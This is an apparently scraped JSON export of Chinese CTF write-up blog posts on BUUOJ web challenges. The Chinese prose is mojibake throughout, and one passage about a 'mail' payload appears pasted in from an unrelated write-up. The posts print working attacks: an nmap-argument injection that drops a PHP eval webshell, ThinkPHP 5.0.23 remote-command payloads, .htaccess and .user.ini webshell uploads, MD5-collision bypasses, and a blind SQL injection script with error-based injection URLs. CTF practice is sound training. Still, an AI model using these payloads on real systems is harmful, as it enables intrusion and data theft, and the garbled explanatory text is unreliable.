[{"title":"buuoj-z7z8","date":"2020-10-08T13:56:01.000Z","path":"2020/10/08/buuoj-z7z8/","text":"buuojâ€“æ‚ä¸ƒæ‚å…« [BUUCTF 2018]Online Tool123456789101112131415161718&lt;?phpif (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) &#123; $_SERVER['REMOTE_ADDR'] = $_SERVER['HTTP_X_FORWARDED_FOR'];&#125;if(!isset($_GET['host'])) &#123; highlight_file(__FILE__);&#125; else &#123; $host = $_GET['host']; $host = escapeshellarg($host); $host = escapeshellcmd($host); $sandbox = md5(\"glzjin\". $_SERVER['REMOTE_ADDR']); echo 'you are in sandbox '.$sandbox; @mkdir($sandbox); //åˆ›å»ºäº†è·¯å¾„ chdir($sandbox); echo system(\"nmap -T5 -sT -Pn --host-timeout 2 -F \".$host);&#125; å‰é¢çš„ä¸¤æ®µä»£ç æ²¡å•¥ç”¨ï¼Œä¸»è¦æ˜¯åé¢å¤„ç† $hostçš„è¿‡ç¨‹ 1.çŸ¥è¯†å‚¨å¤‡ escapeshellarg() å°†ç»™å­—ç¬¦ä¸²å¢åŠ ä¸€ä¸ªå•å¼•å·å¹¶ä¸”èƒ½å¼•ç”¨æˆ–è€…è½¬ç ä»»ä½•å·²ç»å­˜åœ¨çš„å•å¼•å·ï¼Œè¿™æ ·ä»¥ç¡®ä¿èƒ½å¤Ÿç›´æ¥å°†ä¸€ä¸ªå­—ç¬¦ä¸²ä¼ å…¥ shell å‡½æ•°ï¼Œå¹¶ä¸”è¿˜æ˜¯ç¡®ä¿å®‰å…¨çš„ã€‚å¯¹äºç”¨æˆ·è¾“å…¥çš„éƒ¨åˆ†å‚æ•°å°±åº”è¯¥ä½¿ç”¨è¿™ä¸ªå‡½æ•°ã€‚shell å‡½æ•°åŒ…å« exec(), system() æ‰§è¡Œè¿ç®—ç¬¦ ã€‚ escapeshellcmd() å¯¹å­—ç¬¦ä¸²ä¸­å¯èƒ½ä¼šæ¬ºéª— shell å‘½ä»¤æ‰§è¡Œä»»æ„å‘½ä»¤çš„å­—ç¬¦è¿›è¡Œè½¬ä¹‰ã€‚ æ­¤å‡½æ•°ä¿è¯ç”¨æˆ·è¾“å…¥çš„æ•°æ®åœ¨ä¼ é€åˆ° exec() æˆ– system() å‡½æ•°ï¼Œæˆ–è€… æ‰§è¡Œæ“ä½œç¬¦ ä¹‹å‰è¿›è¡Œè½¬ä¹‰ã€‚ åæ–œçº¿ï¼ˆ\\ï¼‰ä¼šåœ¨ä»¥ä¸‹å­—ç¬¦ä¹‹å‰æ’å…¥ï¼š &amp;#;|*?~&lt;&gt;^()[]{}$`, \\x0A å’Œ \\xFFã€‚ &#39; å’Œ &quot; ä»…åœ¨ä¸é…å¯¹å„¿çš„æ—¶å€™è¢«è½¬ä¹‰ã€‚ åœ¨ Windows å¹³å°ä¸Šï¼Œæ‰€æœ‰è¿™äº›å­—ç¬¦ä»¥åŠ % å’Œ ! å­—ç¬¦éƒ½ä¼šè¢«ç©ºæ ¼ä»£æ›¿ã€‚ nampå‘½ä»¤ -T5 :æ‰«æç­‰çº§,è¶Šå¤§è¶Šå¿«,è¶Šå¿«è¶Šä¸å®‰å…¨,æœ€å¥½è®¾ç½®ä¸º-T4-sT :TCP connent æ‰«æ,ä¸å¤ªå®‰å…¨(ç•™ä¸‹è®°å½•ä¿¡æ¯),è€Œä¸”é€Ÿåº¦è¾ƒæ…¢,ä¸€èˆ¬å…ˆä½¿ç”¨-sSæµ‹è¯•-Pn :ç¦ç”¨ping-host-timeout 2:è®¾ç½®æ‰«æä¸€å°ä¸»æœºçš„æ—¶é—´ï¼Œä»¥æ¯«ç§’ä¸ºå•ä½ã€‚-F :å¿«é€Ÿæ‰«ææ¨¡å¼ï¼Œåªæ‰«æåœ¨nmap-servicesæ–‡ä»¶ä¸­åˆ—å‡ºçš„ç«¯å£ã€‚ æ¼æ´ç‚¹åœ¨è¿™ echo system(â€œnmap -T5 -sT -Pn â€“host-timeout 2 -F â€œ.$host); è¿™æœ‰ä¸ªsystemæ¥æ‰§è¡Œå‘½ä»¤ï¼Œè€Œä¸”æœ‰ä¼ å‚ï¼Œè‚¯å®šæ˜¯åˆ©ç”¨è¿™é‡Œäº† 2.æ„é€ payload ä¼ å…¥çš„å‚æ•°æ˜¯ï¼š172.17.0.2&#39; -v -d a=1 ç»è¿‡escapeshellargå¤„ç†åå˜æˆäº†&#39;172.17.0.2&#39;\\&#39;&#39; -v -d a=1&#39;ï¼Œå³å…ˆå¯¹å•å¼•å·è½¬ä¹‰ï¼Œå†ç”¨å•å¼•å·å°†å·¦å³ä¸¤éƒ¨åˆ†æ‹¬èµ·æ¥ä»è€Œèµ·åˆ°è¿æ¥çš„ä½œç”¨ã€‚ ç»è¿‡escapeshellcmdå¤„ç†åå˜æˆ&#39;172.17.0.2&#39;\\\\&#39;&#39; -v -d a=1\\&#39;ï¼Œè¿™æ˜¯å› ä¸ºescapeshellcmdå¯¹\\ä»¥åŠæœ€åé‚£ä¸ªä¸é…å¯¹å„¿çš„å¼•å·è¿›è¡Œäº†è½¬ä¹‰ï¼šhttp://php.net/manual/zh/function.escapeshellcmd.php æœ€åæ‰§è¡Œçš„å‘½ä»¤æ˜¯curl &#39;172.17.0.2&#39;\\\\&#39;&#39; -v -d a=1\\&#39;ï¼Œç”±äºä¸­é—´çš„\\\\è¢«è§£é‡Šä¸º\\è€Œä¸å†æ˜¯è½¬ä¹‰å­—ç¬¦ï¼Œæ‰€ä»¥åé¢çš„&#39;æ²¡æœ‰è¢«è½¬ä¹‰ï¼Œä¸å†åé¢çš„&#39;é…å¯¹å„¿æˆäº†ä¸€ä¸ªç©ºç™½è¿æ¥ç¬¦ã€‚æ‰€ä»¥å¯ä»¥ç®€åŒ–ä¸ºcurl 172.17.0.2\\ -v -d a=1&#39;ï¼Œå³å‘172.17.0.2\\å‘èµ·è¯·æ±‚ï¼ŒPOST æ•°æ®ä¸ºa=1&#39; å›åˆ°mailä¸­ï¼Œæˆ‘ä»¬çš„ payload æœ€ç»ˆåœ¨æ‰§è¡Œæ—¶å˜æˆäº†&#39;-fa&#39;\\\\&#39;&#39;\\( -OQueueDirectory=/tmp -X/var/www/html/test.php \\)@a.com\\&#39;ï¼Œåˆ†å‰²åå°±æ˜¯-fa\\(ã€-OQueueDirectory=/tmpã€-X/var/www/html/test.phpã€)@a.com&#39;ï¼Œæœ€ç»ˆçš„å‚æ•°å°±æ˜¯è¿™æ ·è¢«æ³¨å…¥çš„ã€‚ å‚è€ƒ éœ€è¦ç»•è¿‡ä¸Šé¢çš„ä¸¤ä¸ªå‡½æ•°ï¼Œå…ˆè¯•è¯•ä¸¤ä¸ªå‡½æ•°çš„ä½œç”¨ 12345678&lt;?php$host = \" 1'shellcode \";$host = escapeshellarg($host);echo $host;echo \"\\n\";$host = escapeshellcmd($host);echo $host;?&gt; 12' 1'\\''shellcode '' 1'\\\\''shellcode \\' æ„é€ çš„ä¸€å¥è¯æœ¨é©¬ä¸ºï¼š&#39; &lt;?php @eval($_POST[&quot;hack&quot;]);?&gt; -oG hack.php &#39; è¿è¡Œç»“æœä¸ºï¼š&#39; &#39;\\\\&#39;&#39;\\&lt;\\?php eval\\(\\)\\;\\?\\&gt; -oG 1.php &#39;\\\\&#39;&#39; &#39; è¿™é‡Œçš„å•å¼•å·éƒ½æ˜¯æˆå¯¹å‡ºç°çš„ï¼Œæ‰€ä»¥æ²¡å½±å“ payload: 1?host=' &lt;?php @eval($_POST[\"hack\"]);?&gt; -oG hack.php ' ä¸Šä¼ æ–‡ä»¶çš„ä¿å­˜è·¯å¾„ï¼Œåˆ©ç”¨èšå‰‘é“¾æ¥ä¸€ä¸‹ å‚è€ƒï¼š https://blog.csdn.net/qq_26406447/article/details/100711933 https://blog.csdn.net/zhangxiansheng12/article/details/107216167?utm_medium=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-1.nonecase&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-1.nonecase (å†™çš„æœ‰ç‚¹ä¹±) [BJDCTF 2nd]old-hackæ‰“å¼€é¡µé¢å‡ºç°äº†æç¤º è¿™é‡Œåº”è¯¥æ˜¯php5çš„æ¼æ´åˆ©ç”¨ï¼Œå’Œæ”»é˜²ä¸–ç•Œçš„ä¸€é“é¢˜æ¯”è¾ƒåƒä¼ é€é—¨ å…ˆçœ‹çœ‹æŠ¥é”™ä¿¡æ¯:1 url+?s=1 phpç‰ˆæœ¬ä¸º5.0.23ï¼Œä¸Šç½‘æœäº†ä¸€ä¸‹è¿™ç‰ˆæœ¬çš„æ¼æ´ https://xz.aliyun.com/t/3845 ç›´æ¥æ„é€ payloadï¼Œè¯»å–ç›®å½• 12urlPOST:_method&#x3D;__construct&amp;filter[]&#x3D;system&amp;server[REQUEST_METHOD]&#x3D;ls &#x2F; çœ‹åˆ°äº†flagæ–‡ä»¶ è¯»å–flag 12urlPOST:_method=__construct&amp;filter[]=system&amp;server[REQUEST_METHOD]=cat /flag [MRCTF2020]Ez_bypassI put something in F12 for you 123456789101112131415161718192021222324252627282930include 'flag.php';$flag='MRCTF&#123;xxxxxxxxxxxxxxxxxxxxxxxxx&#125;';if(isset($_GET['gg'])&amp;&amp;isset($_GET['id'])) &#123; $id=$_GET['id']; $gg=$_GET['gg']; if (md5($id) === md5($gg) &amp;&amp; $id !== $gg) &#123; echo 'You got the first step'; if(isset($_POST['passwd'])) &#123; $passwd=$_POST['passwd']; if (!is_numeric($passwd)) &#123; if($passwd==1234567) &#123; echo 'Good Job!'; highlight_file('flag.php'); die('By Retr_0'); &#125; else &#123; echo \"can you think twice??\"; &#125; &#125; else &#123; echo 'You can not get it !'; &#125; &#125; else &#123; die('only one way to get the flag'); &#125; &#125; else &#123; echo \"You are not a real hacker!\"; &#125;&#125; else &#123; die('Please input first');&#125;&#125; å…ˆF12æ‰¾ä¸€æ‰¾æç¤ºï¼ŒåŸæ¥å°±æ˜¯æ ¼å¼åŒ–å¥½çš„æºç  if (md5($id) === md5($gg) &amp;&amp; $id !== $gg) ç›´æ¥ä½¿ç”¨æ•°ç»„ç»•è¿‡ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨md5å¼ºç¢°æ’çš„ä¸¤å­—ç¬¦ä¸² 12param1=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2param2=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2 if (!is_numeric($passwd))å¼±ç±»å‹æ¯”è¾ƒï¼Œä½¿ç”¨1234567aç»•è¿‡ payload: 12345678?id=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2&amp;gg=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2POST:passwd=1234567aæˆ–è€…?id[]=1&amp;gg[]=2POST:passwd=1234567a [å®‰æ´µæ¯ 2019]easy_weburlä¸­åŒ…å«/index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd=ï¼Œä»”ç»†çœ‹TXpVek5UTTFNbVUzTURabE5qYz0å…¶å®æ˜¯base64ç¼–ç ï¼Œè§£ç è¿˜æ˜¯base64ï¼Œç»§ç»­è§£ç ä¸ºä¸€ä¸²åå…­è¿›åˆ¶çš„å­—ç¬¦ï¼Œå†…å®¹ä¸º555.png é€šè¿‡555.png--&gt;TXpVek5UTTFNbVUzTURabE5qYz0å¯ä»¥ç±»å‹çš„æ„é€ å‡ºindex.phpæŸ¥è¯¢ä»£ç  1234567index.php696e6465782e706870Njk2ZTY0NjU3ODJlNzA2ODcwTmprMlpUWTBOalUzT0RKbE56QTJPRGN3 base64è§£ç å 12345678910111213141516171819202122232425262728293031323334353637383940414243&lt;?phperror_reporting(E_ALL || ~ E_NOTICE);header('content-type:text/html;charset=utf-8');$cmd = $_GET['cmd'];if (!isset($_GET['img']) || !isset($_GET['cmd'])) header('Refresh:0;url=./index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd=');$file = hex2bin(base64_decode(base64_decode($_GET['img'])));$file = preg_replace(\"/[^a-zA-Z0-9.]+/\", \"\", $file);if (preg_match(\"/flag/i\", $file)) &#123; echo '&lt;img src =\"./ctf3.jpeg\"&gt;'; die(\"xixiÃ¯Â½Â no flag\");&#125; else &#123; $txt = base64_encode(file_get_contents($file)); echo \"&lt;img src='data:image/gif;base64,\" . $txt . \"'&gt;&lt;/img&gt;\"; //å°†555.pngçš„å†…å®¹ä»¥base64å½¢å¼æ˜¾ç¤º echo \"&lt;br&gt;\";&#125;echo $cmd;echo \"&lt;br&gt;\";if (preg_match(\"/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\\'|\\\"|\\`|;|,|\\*|\\?|\\\\|\\\\\\\\|\\n|\\t|\\r|\\xA0|\\&#123;|\\&#125;|\\(|\\)|\\&amp;[^\\d]|@|\\||\\\\$|\\[|\\]|&#123;|&#125;|\\(|\\)|-|&lt;|&gt;/i\", $cmd)) &#123; //cmdå‚æ•°è¿›è¡Œäº†è¿‡æ»¤ echo(\"forbid ~\"); echo \"&lt;br&gt;\";&#125; else &#123; if ((string)$_POST['a'] !== (string)$_POST['b'] &amp;&amp; md5($_POST['a']) === md5($_POST['b'])) &#123;// md5å¼ºç¢°æ’ echo `$cmd`; &#125; else &#123; echo (\"md5 is funny ~\"); &#125;&#125;?&gt;&lt;html&gt;&lt;style&gt; body&#123; background:url(./bj.png) no-repeat center center; background-size:cover; background-attachment:fixed; background-color:#CCCCCC;&#125;&lt;/style&gt;&lt;body&gt;&lt;/body&gt;&lt;/html&gt; 1234$file = hex2bin(base64_decode(base64_decode($_GET['img'])));//è¿™é‡Œå°†imgçš„å€¼ä¸¤æ¬¡base64è§£ç åèµ‹å€¼ç»™äº†fileå˜é‡...$txt = base64_encode(file_get_contents($file));//è¿™é‡Œå­˜åœ¨file_get_contents()å‡½æ•°ï¼Œç›´æ¥è¯»å–æ–‡ä»¶çš„å†…å®¹ è¿™é¢˜è¿˜å¯¹ä¸€äº›ç³»ç»Ÿå‘½ä»¤è¿›è¡Œäº†è¿‡æ»¤ï¼Œè¿™é‡Œéœ€è¦æƒ³åŠæ³•ç»•è¿‡ lsï¼Œä¸å¯ä»¥ä½¿ç”¨ï¼Œä½†æ˜¯diræ²¡æœ‰è¿‡æ»¤ï¼Œå¯ä»¥ä½¿ç”¨dir%20/è¯»å–ç›®å½• catè¢«è¿‡æ»¤äº†ï¼Œä½†æ˜¯å¯ä»¥ä½¿ç”¨ca\\tç»•è¿‡ï¼Œca\\t%20/flag (linuxå‘½ä»¤ä¸­å¯ä»¥åŠ \\) if ((string)$_POST[&#39;a&#39;] !== (string)$_POST[&#39;b&#39;] &amp;&amp; md5($_POST[&#39;a&#39;]) === md5($_POST[&#39;b&#39;])) md5å¼ºç¢°æ’çš„å­—ç¬¦ä¸² 12a=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2&amp;b=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2 å‚è€ƒï¼š https://www.jianshu.com/p/21e3e1f74c08 [BJDCTF2020]Mark loves catå˜é‡è¦†ç›– 123456789101112131415161718192021222324252627282930313233&lt;?phpinclude 'flag.php';$yds = \"dog\";$is = \"cat\";$handsome = 'yds';foreach($_POST as $x =&gt; $y)&#123;//$flag=flag $$x = $y;&#125;$flag = flag foreach($_GET as $x =&gt; $y)&#123; //yds=flag $$x = $$y; //$yds = $flag &#125;foreach($_GET as $x =&gt; $y)&#123; if($_GET['flag'] === $x &amp;&amp; $x !== 'flag')&#123; // yds=flag exit($handsome); &#125;&#125;if(!isset($_GET['flag']) &amp;&amp; !isset($_POST['flag']))&#123; exit($yds);&#125;if($_POST['flag'] === 'flag' || $_GET['flag'] === 'flag')&#123; exit($is);&#125;echo \"the flag is: \".$flag; poyload: 12?yds=flagPOST: $flag=flag","tags":[{"name":"shell","slug":"shell","permalink":"https://sunzhengyu99.github.io/tags/shell/"}]},{"title":"buuoj-LFI","date":"2020-10-08T12:35:05.000Z","path":"2020/10/08/buuoj-LFI/","text":"","tags":[{"name":"LFI","slug":"LFI","permalink":"https://sunzhengyu99.github.io/tags/LFI/"}]},{"title":"buuoj-upload","date":"2020-10-08T12:34:58.000Z","path":"2020/10/08/buuoj-upload/","text":"buuoj-upload [MRCTF2020]ä½ ä¼ ä½ ğŸå‘¢å…ˆä¸Šä¼ ä¸€ä¸ªå›¾ç‰‡ï¼Œå‘ç°ä¸Šä¼ æˆåŠŸäº†ï¼Œè¿˜ç»™å‡ºäº†æ–‡ä»¶çš„ä¿å­˜è·¯å¾„ å†å°è¯•ä¸Šä¼ 1.phpä½†æ˜¯å‡ºç°äº†ï¼ŒæŠ¥é”™æç¤º é¦–å…ˆå°è¯•çš„æ˜¯ï¼Œå°†Content-Type: image/jpegæ”¹ä¸ºå›¾ç‰‡ç±»å‹ï¼Œä½†æ˜¯è¿˜æ˜¯æ— æ³•ä¸Šä¼  å†å°è¯•ä¸€ä¸‹.htaccessæ–‡ä»¶ æ–‡ä»¶å†…å®¹ \"a.jpg\">12SetHandler application&#x2F;x-httpd-php&lt;&#x2F;FilesMatch&gt; ä¸Šä¼ æˆåŠŸåï¼Œå†ä¸Šä¼ åŒ…å«ä¸€å¥è¯æœ¨é©¬çš„ a.jpgæ–‡ä»¶ï¼Œ.htaccessæ–‡ä»¶çš„ä½œç”¨å°±æ˜¯å°†æŒ‡å®šç±»å‹çš„æ–‡ä»¶å½“ä½œphpæ–‡ä»¶è¿è¡Œ æ‰€ä»¥è¡¨é¢ä¸Šæ˜¯jpgç±»å‹çš„æ–‡ä»¶ï¼Œä½†æ˜¯æ˜¯å½“ä½œphpæ–‡ä»¶ ä¸Šä¼ æˆåŠŸåï¼Œèšå‰‘è®¿é—®url+/upload/3af588e32ac72180588d18d5c3b470b4/a.jpg å¯†ç ä¸ºï¼šcmd [SUCTF 2019]CheckInè¯•ç€ä¸Šä¼ phpæ–‡ä»¶ï¼Œæç¤ºéæ³•åç¼€åï¼Œç»§ç»­ä¿®æ”¹åç¼€åï¼Œå‘ç°php3,php5,phtmlç­‰å¯æ‰§è¡Œæ–‡ä»¶åä¸å¯ä¸Šä¼  æƒ³åˆ°ä¸Šä¼ .htacessæ–‡ä»¶ï¼Œä½†æ˜¯ä¹Ÿæç¤ºäº†éæ³•åç¼€åï¼Œè¿™ä¸ªæ–¹æ³•è¡Œä¸é€šäº† ä½†æ˜¯ä¹‹å‰åšupload-labsä¸­è¿˜æœ‰ä¸€ä¸ªä¸Šä¼ .user.iniçš„æ–‡ä»¶ .user.iniæ˜¯ä»€ä¹ˆ è¿™å¾—ä»php.iniè¯´èµ·äº†ã€‚php.iniæ˜¯phpé»˜è®¤çš„é…ç½®æ–‡ä»¶ï¼Œå…¶ä¸­åŒ…æ‹¬äº†å¾ˆå¤šphpçš„é…ç½®ï¼Œè¿™äº›é…ç½®ä¸­ï¼Œåˆåˆ†ä¸ºå‡ ç§ï¼šPHP_INI_SYSTEMã€PHP_INI_PERDIRã€PHP_INI_ALLã€PHP_INI_USERã€‚ .user.iniçš„ä½œç”¨ å¯ä»¥å€ŸåŠ©.user.iniè½»æ¾è®©æ‰€æœ‰phpæ–‡ä»¶éƒ½â€œè‡ªåŠ¨â€åŒ…å«æŸä¸ªæ–‡ä»¶ï¼Œè€Œè¿™ä¸ªæ–‡ä»¶å¯ä»¥æ˜¯ä¸€ä¸ªæ­£å¸¸phpæ–‡ä»¶ï¼Œä¹Ÿå¯ä»¥æ˜¯ä¸€ä¸ªåŒ…å«ä¸€å¥è¯çš„webshell ä¼ é€é—¨ å¼€å§‹åšé¢˜ ä¸Šä¼ .user.iniæ–‡ä»¶ GIF89aæ˜¯GIFæ–‡ä»¶å†…å®¹å¼€å¤´çš„å‡ ä¸ªå­—ç¬¦ï¼Œå…¶ä½œç”¨æ˜¯ä¸ºç±»ç»•è¿‡exif_imagetype() ä¸Šä¼ 1.gif æ–‡ä»¶ä¿å­˜çš„è·¯å¾„å·²ç»ç»™å‡ºï¼Œå¼€å§‹èšå‰‘é“¾æ¥çš„è¿æ¥æ˜¯ 1url/uploads/04b0951938d905b41348c1548f9c338b/1.gif ä½†æ˜¯ä¸€ç›´è¿æ¥ä¸ä¸Š åæ¥é“¾æ¥index.phpæ‰è¿æ¥ä¸Šï¼Œè¿™é‡Œæƒ³åˆ°äº†.user.iniä½œç”¨ï¼Œæ˜¯è®©æ‰€æœ‰çš„phpæ–‡ä»¶åŒ…å«æ•´ä¸ªä¸€å¥è¯æœ¨é©¬ï¼Œè€Œè¿™é‡Œæ–‡ä»¶è·¯å¾„å­˜åœ¨ä¸€ä¸ªindex.phpï¼Œæ‰€æœ‰è¯´index.phpä¸­ä¹Ÿå­˜åœ¨è¿™ä¸ªä¸€å¥è¯æœ¨é©¬ 1/uploads/04b0951938d905b41348c1548f9c338b/index.php","tags":[{"name":".htacess","slug":"htacess","permalink":"https://sunzhengyu99.github.io/tags/htacess/"},{"name":".user.ini","slug":"user-ini","permalink":"https://sunzhengyu99.github.io/tags/user-ini/"}]},{"title":"buuoj","date":"2020-10-05T10:29:30.000Z","path":"2020/10/05/buuoj/","text":"buuojâ€“æ³¨å…¥ç¯‡ [CISCN2019 ååŒ—èµ›åŒº Day2 Web1]Hack Worldç»™äº†æç¤ºï¼ŒAll You Want Is In Table &#39;flag&#39; and the column is &#39;flag&#39; çŒœæµ‹flagåœ¨flag è¡¨ä¸­ï¼ŒæŸ¥è¯¢è¯­å¥åº”è¯¥æ˜¯ select flag from flag ç»è¿‡æµ‹è¯•ï¼Œå‘ç°è¿™é¢˜è¿‡æ»¤äº†å¾ˆå¤šå…³é”®å­—ï¼Œor,union,orderç­‰ï¼ŒçŒœæµ‹æ˜¯ç›²æ³¨ æ„é€ ç›²æ³¨è¯­å¥ id=if((ascii(substr((select(flag)from(flag)),0,1))&gt;90),1,2) ä¸¤æ¬¡çš„æç¤ºè¯­å¥ä¸ä¸€æ ·ï¼Œè¯´æ˜è¿™ä¸ªæ³¨å…¥è¯­å¥æ˜¯å¯¹çš„ï¼Œä¸”å½“æç¤ºHelloæ—¶åº”è¯¥æ˜¯å¯¹çš„ã€‚ 12345678910111213141516171819202122232425// äºŒåˆ†æ³¨å…¥import requestsurl = \"http://376688f4-59c4-4f47-8d0e-36c966e45631.node3.buuoj.cn/index.php\"data = &#123;id : \"\"&#125;flag = \"\"for i in range(50): right = 33 left = 128 mid = (right + left) &gt;&gt; 1 while(right&lt;left): data[\"id\"] = \"if((ascii(substr((select(flag)from(flag)),&#123;0&#125;,1))&gt;&#123;1&#125;),1,2)\".format(i,mid) response = requests.post(url,data=data) if \"Hello\" in response.text: right = mid+1 else: left = mid mid=(right+left)&gt;&gt;1 flag = flag + chr(mid) print(flag)print(flag) [æå®¢å¤§æŒ‘æˆ˜ 2019]HardSQLæŠ¥é”™æ³¨å…¥ æµ‹è¯•å‘ç° or,union,substr,ç©ºæ ¼,/**/ç­‰éƒ½è¢«åŠ å…¥é»‘åå•ï¼ŒåŒå†™ä¹Ÿæ— æ³•ç»•è¿‡ å¯æ˜¯ä½¿ç”¨æŠ¥é”™æ³¨å…¥ æŠ¥é”™æ³¨å…¥åŸç†ï¼š å…¶åŸå› ä¸»è¦æ˜¯å› ä¸ºè™šæ‹Ÿè¡¨çš„ä¸»é”®é‡å¤ã€‚æŒ‰ç…§MySQLçš„å®˜æ–¹è¯´æ³•ï¼Œgroup byè¦è¿›è¡Œä¸¤æ¬¡è¿ç®—ï¼Œç¬¬ä¸€æ¬¡æ˜¯æ‹¿group byåé¢çš„å­—æ®µå€¼åˆ°è™šæ‹Ÿè¡¨ä¸­å»å¯¹æ¯”å‰ï¼Œé¦–å…ˆè·å–group byåé¢çš„å€¼ï¼›ç¬¬äºŒæ¬¡æ˜¯å‡è®¾group byåé¢çš„å­—æ®µçš„å€¼åœ¨è™šæ‹Ÿè¡¨ä¸­ä¸å­˜åœ¨ï¼Œé‚£å°±éœ€è¦æŠŠå®ƒæ’å…¥åˆ°è™šæ‹Ÿè¡¨ä¸­ï¼Œè¿™é‡Œåœ¨æ’å…¥æ—¶ä¼šè¿›è¡Œç¬¬äºŒæ¬¡è¿ç®—ï¼Œç”±äºrandå‡½æ•°å­˜åœ¨ä¸€å®šçš„éšæœºæ€§ï¼Œæ‰€ä»¥ç¬¬äºŒæ¬¡è¿ç®—çš„ç»“æœå¯èƒ½ä¸ç¬¬ä¸€æ¬¡è¿ç®—çš„ç»“æœä¸ä¸€è‡´ï¼Œä½†æ˜¯è¿™ä¸ªè¿ç®—çš„ç»“æœå¯èƒ½åœ¨è™šæ‹Ÿè¡¨ä¸­å·²ç»å­˜åœ¨äº†ï¼Œé‚£ä¹ˆè¿™æ—¶çš„æ’å…¥å¿…ç„¶å¯¼è‡´ä¸»é”®çš„é‡å¤ï¼Œè¿›è€Œå¼•å‘é”™è¯¯ã€‚ ç›¸å…³é“¾æ¥ https://www.cnblogs.com/richardlee97/p/10617115.html https://www.jianshu.com/p/d8ae3e8dabdc https://blog.csdn.net/qq_37873738/article/details/88042610 UPDATEXML (XML_document, XPath_string, new_value);ç¬¬ä¸€ä¸ªå‚æ•°ï¼šXML_documentæ˜¯Stringæ ¼å¼ï¼Œä¸ºXMLæ–‡æ¡£å¯¹è±¡çš„åç§°ï¼Œæ–‡ä¸­ä¸ºDocç¬¬äºŒä¸ªå‚æ•°ï¼šXPath_string (Xpathæ ¼å¼çš„å­—ç¬¦ä¸²) ã€‚ç¬¬ä¸‰ä¸ªå‚æ•°ï¼šnew_valueï¼ŒStringæ ¼å¼ï¼Œæ›¿æ¢æŸ¥æ‰¾åˆ°çš„ç¬¦åˆæ¡ä»¶çš„æ•°æ® æŸ¥è¯¢è¯­å¥å¦‚ä¸‹ 12345?username=admin&amp;password=dad%27or(updatexml(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema)like(database())),0x7e),1))%23?username=admin&amp;password=dad%27or(updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name)like('H4rDsq1')),0x7e),1))%23?username=admin&amp;password=dad%27or(updatexml(1,concat(0x7e,(select(password)from(H4rDsq1)),0x7e),1))%23 è¿™é‡Œä¼šå‘ç°flagæ˜¾ç¤ºä¸å…¨ï¼Œå¯èƒ½æ˜¯æŠ¥é”™ç°å®çš„å­—æ•°é™åˆ¶ï¼Œåˆ©ç”¨right/leftå‡½æ•°ï¼Œæ˜¾ç¤ºéƒ¨åˆ†çš„flagï¼Œä¹‹åæ‹¼æ¥èµ·æ¥ æ˜¾ç¤ºåé¢çš„flag 1?username=admin&amp;password=dad%27or(updatexml(1,concat(0x7e,(select(right(password,30))from(geek.H4rDsq1)),0x7e),1))%23 [ç½‘é¼æ¯ 2018]Fakebooksqlæ³¨å…¥+ååºåˆ—åŒ–+ä»£ç å®¡è®¡ [GXYCTF2019]BabySQliä¸‹è½½çš„æºç ï¼Œæœ‰åŠ©äºåé¢åšé¢˜ 123456789101112131415161718192021222324252627282930313233mysqli_query($con,'SET NAMES UTF8');$name = $_POST['name'];$password = $_POST['pw'];$t_pw = md5($password); //å¯¹ä¼ å…¥çš„passwordå‚æ•°è¿›è¡Œäº†md5åŠ å¯†$sql = \"select * from user where username = '\".$name.\"'\";// echo $sql;$result = mysqli_query($con, $sql);if(preg_match(\"/\\(|\\)|\\=|or/\", $name))&#123; // è¿‡æ»¤äº†() | = or die(\"do not hack me!\");&#125;else&#123; if (!$result) &#123; printf(\"Error: %s\\n\", mysqli_error($con)); exit(); &#125; else&#123; // echo '&lt;pre&gt;'; $arr = mysqli_fetch_row($result); // print_r($arr); if($arr[1] == \"admin\")&#123; if(md5($password) == $arr[2])&#123; // echo $flag; &#125; else&#123; die(\"wrong pass!\"); &#125; &#125; else&#123; die(\"wrong user!\"); &#125; &#125;&#125; éšä¾¿è¾“å…¥ç”¨æˆ·åå’Œå¯†ç ï¼ŒæŸ¥çœ‹æºç ï¼Œå‡ºç°æç¤º è¯•äº†è¯•åº”è¯¥æ˜¯base32ï¼Œè§£ç åæ˜¯base64 1c2VsZWN0ICogZnJvbSB1c2VyIHdoZXJlIHVzZXJuYW1lID0gJyRuYW1lJw== ç»§ç»­è§£ç  1select * from user where username = '$name' 